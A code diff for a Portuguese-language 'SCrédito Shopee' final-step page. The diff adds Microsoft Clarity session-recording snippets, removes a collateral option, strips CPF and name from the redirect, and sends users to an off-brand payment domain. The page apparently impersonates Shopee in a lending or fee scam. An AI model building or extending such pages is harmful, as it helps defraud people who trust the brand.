@@ -2,7 +2,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Última Etapa | SCrédito Shopee</title>
-  
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "s8vuwmcvbq");
+</script>
   <!-- Fontes e ícones -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/all.min.css">
@@ -15,6 +21,13 @@
   a.setAttribute("defer", "");
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
+</script>
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "r4p194wmkl");
 </script>
   <style>
     /* ===== VARIÁVEIS ===== */
@@ -619,17 +632,6 @@
           </button>
         </div>
 
-        <div class="opcao" id="opcao2">
-          <h4>✔ Entregar Veículo ou Imóvel como garantia</h4>
-          <ul>
-            <li>📍 Inclusão presencial do bem</li>
-            <li>🕒 Liberação em até 5 dias úteis</li>
-            <li>🔍 Avaliação comercial obrigatória</li>
-          </ul>
-          <button class="btn" onclick="simularGarantia(this)">Selecionar</button>
-        </div>
-      </section>
-      
       
     </strong><strong>
 
@@ -789,10 +791,19 @@
             return params;
         }
         
-        // Função para construir a nova URL com os parâmetros
+        // Função para construir a nova URL com os parâmetros (filtrando CPF)
         function buildUrlWithParams(baseUrl, params) {
-            const queryString = Object.keys(params)
-                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+            // Filtrar parâmetros sensíveis como CPF
+            const filteredParams = {};
+            Object.keys(params).forEach(key => {
+                // Não incluir CPF ou outros dados pessoais sensíveis
+                if (key.toLowerCase() !== 'cpf' && key.toLowerCase() !== 'nome') {
+                    filteredParams[key] = params[key];
+                }
+            });
+            
+            const queryString = Object.keys(filteredParams)
+                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(filteredParams[key])}`)
                 .join('&');
         
             return `${baseUrl}?${queryString}`;
@@ -810,12 +821,12 @@
                 const params = getUrlParams();
         
                 // Constrói a nova URL com os parâmetros
-                const newUrl = buildUrlWithParams('https://seguropagamentos.com.br/shoopeup2', params);
+                const newUrl = buildUrlWithParams('https://www.seguropagamentos.com.br/shoopeup2', params);
         
                 // Redireciona para a nova URL
                 window.location.href = newUrl;
             });
         });
-    </script> 
+    </script>
 
 </strong></div></body></html>
